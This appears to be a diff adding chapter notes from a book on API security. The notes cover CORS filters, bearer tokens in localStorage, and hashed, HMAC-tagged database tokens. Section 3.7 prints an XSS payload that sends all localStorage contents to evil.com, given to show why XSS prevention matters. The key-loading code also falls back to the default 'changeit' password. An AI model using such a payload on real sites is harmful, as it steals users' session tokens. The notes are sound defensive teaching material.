@@ -1,0 +1,324 @@
+1. The Problem: Cookies Don’t Cross Domains Well
+Your current system uses session cookies, which are great for same‑origin clients. But now Marketing wants a new domain, nat.tr, to talk to the same API on api.example.com. Three obstacles arise:
+
+Same‑Origin Policy (SOP) blocks cross‑origin fetch with application/json content type.
+
+Browsers ignore Set‑Cookie on cross‑origin responses, so the session cookie is never stored.
+
+Even if the user is already logged in, the anti‑CSRF token can’t be read cross‑origin because cookies are isolated by domain.
+
+To allow cross‑domain access, you need CORS. But even with CORS, cookies are increasingly restricted by browsers (SameSite defaults, privacy features). So the chapter moves away from cookies entirely, replacing them with an explicit token passed in an Authorization header and stored in the browser’s localStorage.
+
+2. Allowing Cross‑Domain Requests with CORS
+2.1 Same‑Origin Policy Recap
+The browser’s SOP allows scripts from one origin to send requests to another origin but blocks reading the response unless the server explicitly permits it. The origin is the triple (protocol, host, port). A cross‑origin POST with Content-Type: application/json is not a “simple” request, so the browser does a preflight check before sending it.
+
+2.2 Preflight Requests
+When a script tries a non‑simple cross‑origin request, the browser first sends an OPTIONS request to the target server with:
+
+Origin: the requesting page’s origin.
+
+Access-Control-Request-Method: the HTTP method of the real request (e.g., POST).
+
+Access-Control-Request-Headers: any non‑simple headers (like Content-Type, Authorization).
+
+The server must respond with CORS headers indicating if the real request is allowed. If not, the browser blocks the actual request.
+
+2.3 CORS Response Headers
+The server replies to the preflight with:
+
+Header	Meaning
+Access-Control-Allow-Origin	Which origin(s) are allowed. Must be a single origin or * (but * cannot be used with credentials).
+Access-Control-Allow-Methods	Allowed HTTP methods, e.g., GET, POST, DELETE.
+Access-Control-Allow-Headers	Allowed non‑simple headers, e.g., Content-Type, Authorization.
+Access-Control-Allow-Credentials	If true, the browser may include cookies/HTTP auth in the real request.
+Access-Control-Max-Age	How long (seconds) the browser may cache this preflight response.
+Access-Control-Expose-Headers	Which response headers the script is allowed to read.
+When credentials are allowed, the Access-Control-Allow-Origin must be an exact origin (not *), and you should add Vary: Origin to avoid caching issues.
+
+2.4 Implementing the CORS Filter
+The book builds a Spark Filter that:
+
+Checks the Origin header against a whitelist of allowed origins.
+
+If the origin is allowed, sets Access-Control-Allow-Origin (echoing the origin) and Access-Control-Allow-Credentials: true (initially needed for cookies).
+
+For preflight requests (OPTIONS with Access-Control-Request-Method):
+
+If the origin is not allowed, halts with 403.
+
+Otherwise, sets Allow-Headers and Allow-Methods as needed and halts with 204 No Content.
+
+Initial CORS configuration for cookie‑based cross‑origin (which later gets simplified):
+
+java
+class CorsFilter implements Filter {
+  private final Set<String> allowedOrigins;
+  CorsFilter(Set<String> allowedOrigins) {
+    this.allowedOrigins = allowedOrigins;
+  }
+  @Override
+  public void handle(Request request, Response response) {
+    var origin = request.headers("Origin");
+    if (origin != null && allowedOrigins.contains(origin)) {
+      response.header("Access-Control-Allow-Origin", origin);
+      response.header("Access-Control-Allow-Credentials", "true");
+      response.header("Vary", "Origin");
+    }
+    if (isPreflightRequest(request)) {
+      if (origin == null || !allowedOrigins.contains(origin)) {
+        halt(403);
+      }
+      response.header("Access-Control-Allow-Headers",
+          "Content-Type, Authorization, X-CSRF-Token");
+      response.header("Access-Control-Allow-Methods",
+          "GET, POST, DELETE");
+      halt(204);
+    }
+  }
+  private boolean isPreflightRequest(Request request) {
+    return "OPTIONS".equals(request.requestMethod()) &&
+      request.headers().contains("Access-Control-Request-Method");
+  }
+}
+In Main.java, add it early (after rate limiting) so preflight requests are handled before authentication (which would fail because preflight never sends credentials).
+
+2.5 Client‑Side: credentials: 'include'
+For cookies to be sent/received cross‑origin, the fetch call must set credentials: 'include'. The browser then honors Set-Cookie only if the response has Access-Control-Allow-Credentials: true. The login UI does this initially.
+
+Problem: SameSite cookies (like those we set in Chapter 4) are fundamentally incompatible with cross‑site CORS requests. Modern browsers are moving toward SameSite=Lax by default, making cross‑origin cookie usage increasingly fragile. This pushes us to abandon cookies entirely.
+
+3. Moving Away from Cookies – Database Tokens
+Cookies provided three things:
+
+Server‑side state (Spark’s session store).
+
+Standard communication (Cookie/Set-Cookie headers).
+
+Client‑side storage (browser cookie jar).
+
+We will replace each:
+
+Server‑side: implement a DatabaseTokenStore.
+
+Communication: use the Authorization: Bearer <token> header.
+
+Client storage: use the Web Storage API (localStorage).
+
+3.1 Database Token Store Schema
+Create a tokens table:
+
+sql
+CREATE TABLE tokens(
+    token_id VARCHAR(100) PRIMARY KEY,
+    user_id VARCHAR(30) NOT NULL,
+    expiry TIMESTAMP NOT NULL,
+    attributes VARCHAR(4096) NOT NULL
+);
+The attributes column stores a JSON string of any extra data (like the user’s IP, auth method). Permissions: SELECT, INSERT, DELETE for the API user.
+
+3.2 Generating Secure Token IDs
+Token IDs must be unguessable. Use a cryptographically secure random number generator (SecureRandom) to produce 20 random bytes, then Base64url‑encode them. This yields ~160 bits of entropy, making brute‑force guessing infeasible.
+
+java
+private String randomId() {
+    var bytes = new byte[20];
+    new SecureRandom().nextBytes(bytes);
+    return Base64url.encode(bytes);
+}
+⚠️ Never use java.util.Random, database sequences, or predictable values. SecureRandom seeds from OS entropy (e.g., /dev/urandom on Linux), which is designed to never run out.
+
+3.3 DatabaseTokenStore Implementation
+create() – generates ID, serializes attributes to JSON, inserts into DB, returns the ID.
+
+read() – queries by token_id, deserializes JSON back into Token.
+
+revoke() – deletes the row by ID.
+
+java
+public String create(Request request, Token token) {
+    var tokenId = randomId();
+    var attrs = new JSONObject(token.attributes).toString();
+    database.updateUnique("INSERT INTO tokens(token_id, user_id, expiry, attributes) VALUES(?,?,?,?)",
+        tokenId, token.username, token.expiry, attrs);
+    return tokenId;
+}
+Wire it in Main.java:
+
+java
+var databaseTokenStore = new DatabaseTokenStore(database);
+var tokenStore = databaseTokenStore; // will later be wrapped with HMAC
+var tokenController = new TokenController(tokenStore);
+Now login returns a token ID (no Set-Cookie), e.g., {"token":"QDAmQ9TStkDCpVK5A9kFowtYn2k"}.
+
+3.4 The Bearer Authentication Scheme
+We standardize token transmission using HTTP Bearer auth (RFC 6750). The client sends:
+
+text
+Authorization: Bearer QDAmQ9TStkDCpVK5A9kFowtYn2k
+The server extracts the token from that header. In TokenController.validateToken:
+
+java
+var tokenId = request.headers("Authorization");
+if (tokenId == null || !tokenId.startsWith("Bearer ")) return;
+tokenId = tokenId.substring(7); // remove "Bearer "
+// then look up in token store
+If the token is expired, we return 401 with a standard challenge:
+
+text
+WWW-Authenticate: Bearer error="invalid_token", error_description="Expired"
+And we re‑enable a proper 401 challenge in requireAuthentication():
+
+java
+response.header("WWW-Authenticate", "Bearer");
+halt(401);
+This makes the API HTTP‑compliant again.
+
+3.5 Cleaning Up Expired Tokens
+Without cookies, tokens persist in the database forever. We schedule a periodic cleanup:
+
+java
+public void deleteExpiredTokens() {
+    database.update("DELETE FROM tokens WHERE expiry < current_timestamp");
+}
+Add an index on expiry for efficiency. Run this every 10 minutes via a scheduled executor.
+
+3.6 Client Storage: Web Storage
+We replace the cookie‑based token storage with localStorage.
+
+login.js sets: localStorage.setItem('token', json.token);
+
+natter.js reads: let token = localStorage.getItem('token');
+
+Requests now attach: 'Authorization': 'Bearer ' + token
+
+No more CSRF tokens, no more cookies. The browser will not automatically attach the token to cross‑origin requests, so CSRF is eliminated. However, a new risk appears: XSS can steal the token from localStorage.
+
+3.7 XSS Exfiltration from Web Storage
+If an attacker finds an XSS vulnerability, they can run:
+
+javascript
+for (var i = 0; i < localStorage.length; ++i) {
+    var key = localStorage.key(i);
+    new Image().src = 'https://evil.com/steal?key=' + encodeURIComponent(key) +
+                      '&value=' + encodeURIComponent(localStorage.getItem(key));
+}
+This silently sends all stored data to the attacker’s server. Unlike HttpOnly cookies, localStorage is always readable from JavaScript on the same origin. Therefore, preventing XSS is critical. The book reiterates the importance of CSP and mentions Trusted Types as future defenses.
+
+3.8 Streamlining CORS for Token‑Only API
+Since we no longer use cookies, we can remove:
+
+Access-Control-Allow-Credentials header.
+
+credentials: 'include' from the client fetch.
+
+X-CSRF-Token from the allowed headers.
+
+The final CORS filter just sets Access-Control-Allow-Origin (exact origin), Allow-Headers: Content-Type, Authorization, Allow-Methods: GET, POST, DELETE.
+
+4. Hardening the Database Token Store
+Tokens in the database are valuable targets. An attacker who gains read access can steal tokens; write access lets them forge tokens; delete access causes denial of service. We apply layered defenses.
+
+4.1 Hashing Tokens
+Instead of storing the raw token ID, store its SHA‑256 hash. When the client presents a token, hash it and look up the hash. This prevents an attacker with read access from using the tokens, because they only see hashes and cannot reverse them (unlike passwords, tokens have high entropy, so a fast hash is sufficient).
+
+java
+private String hash(String tokenId) {
+    return Base64url.encode(CookieTokenStore.sha256(tokenId));
+}
+
+// create: store hash(tokenId) in DB, return raw tokenId to client.
+// read:   select by hash(tokenId)
+4.2 Message Authentication Code (HMAC) for Integrity and Anti‑Forgery
+Hashing alone does not prevent an attacker with write access from inserting a fake token (they could compute the hash of a chosen token and insert it). Also, database lookups may not be constant‑time, leaking information.
+
+We introduce an HMAC tag. The server holds a secret key. For each token ID, compute HMAC-SHA256(key, tokenId), and append the tag to the token given to the client: tokenId + '.' + base64url(tag). The database still stores only the original token ID (hashed or not), but now any attacker without the key cannot produce a valid tag.
+
+When a token is presented, the server splits the token into ID and tag, recomputes the tag with the secret, and compares using constant‑time equality (MessageDigest.isEqual). If invalid, the request is rejected before any database lookup, preventing timing attacks and forgery.
+
+Important: Constant‑time comparison is essential. Do not use String.equals() or Arrays.equals().
+
+4.3 Implementation: HmacTokenStore Wrapper
+Create a class that wraps any TokenStore (like DatabaseTokenStore). It delegates create/read/revoke but adds HMAC tagging.
+
+java
+public class HmacTokenStore implements TokenStore {
+    private final TokenStore delegate;
+    private final Key macKey;
+
+    public HmacTokenStore(TokenStore delegate, Key macKey) {
+        this.delegate = delegate;
+        this.macKey = macKey;
+    }
+
+    // In create: tokenId = delegate.create(...); tag = hmac(tokenId); return tokenId + '.' + base64url(tag)
+    // In read: split, verify tag (constant-time), then delegate.read(realTokenId)
+    // In revoke: similarly verify tag, then delegate.revoke
+}
+4.4 Key Management with a Keystore
+The HMAC key must be consistent across all API servers and restarts. Generate a 256‑bit key and store it in a PKCS#12 keystore using keytool:
+
+bash
+keytool -genseckey -keyalg HmacSHA256 -keysize 256 \
+    -alias hmac-key -keystore keystore.p12 -storetype PKCS12 -storepass changeit
+In code, load the keystore with the password (supplied via system property, never hard‑coded), extract the key, and pass it to HmacTokenStore.
+
+java
+var keyPassword = System.getProperty("keystore.password", "changeit").toCharArray();
+var keyStore = KeyStore.getInstance("PKCS12");
+keyStore.load(new FileInputStream("keystore.p12"), keyPassword);
+var macKey = keyStore.getKey("hmac-key", keyPassword);
+
+var databaseTokenStore = new DatabaseTokenStore(database);
+var tokenStore = new HmacTokenStore(databaseTokenStore, macKey);
+4.5 Protecting Sensitive Attributes
+Token attributes (e.g., user location, device info) may be sensitive. If the database is compromised, these are exposed. Options:
+
+Application‑level encryption: encrypt attribute JSON before storing. Complex, especially if you need to search within attributes.
+
+Row‑level security: some databases allow policies that restrict which rows a query can see (e.g., only tokens belonging to the current user). This can prevent a SQL injection from reading other users’ tokens. H2 does not support it; PostgreSQL does.
+
+Separate database accounts: use a CQRS‑style pattern where the query API uses a limited database user that cannot update/delete, and the cleanup job uses a different account with delete privileges. This limits the blast radius of an injection attack.
+
+The book recommends prioritizing access controls and row‑level security over full application‑level encryption.
+
+5. Putting It All Together: The Final Flow
+User visits login.html (cross‑origin) and submits credentials.
+
+Browser sends POST /sessions with Authorization: Basic ... and Origin: https://nat.tr:9999.
+
+CORS filter allows the origin; preflight succeeds.
+
+Server authenticates, creates token (via HmacTokenStore → DatabaseTokenStore), returns token ID with HMAC tag.
+
+Client stores token in localStorage.
+
+On subsequent API calls, client sends Authorization: Bearer <tokenId.tag>.
+
+validateToken filter splits, verifies HMAC tag (constant‑time), strips tag, looks up token hash in DB.
+
+If valid, sets subject attribute; access control proceeds.
+
+Now the API works seamlessly across domains, without CSRF, and with strong protections against database compromise.
+
+Summary of Key Takeaways
+CORS is required for cross‑origin API calls. Preflight requests and specific headers control access. Avoid using cookies with CORS due to growing browser restrictions.
+
+Web Storage (localStorage) replaces cookies for client‑side token storage, eliminating CSRF but requiring strict XSS prevention.
+
+Bearer authentication is the standard HTTP scheme for tokens; use Authorization: Bearer <token> and WWW-Authenticate: Bearer challenges.
+
+Token IDs must be generated with a cryptographically strong RNG (20+ bytes, Base64url). Never use predictable sequences.
+
+Hash tokens in the database to prevent use if the DB is read. Use a fast hash (SHA‑256) because tokens have high entropy.
+
+Add an HMAC tag to protect against forgery and to allow safe, constant‑time verification before touching the database.
+
+Store the HMAC key in a secure keystore, never in code. Use PKCS#12 and supply the password externally.
+
+Constant‑time comparison (MessageDigest.isEqual) is mandatory when comparing HMAC tags.
+
+Periodically delete expired tokens and create a database index on the expiry column.
+
+For extra protection, employ row‑level security and split database permissions (CQRS).
+
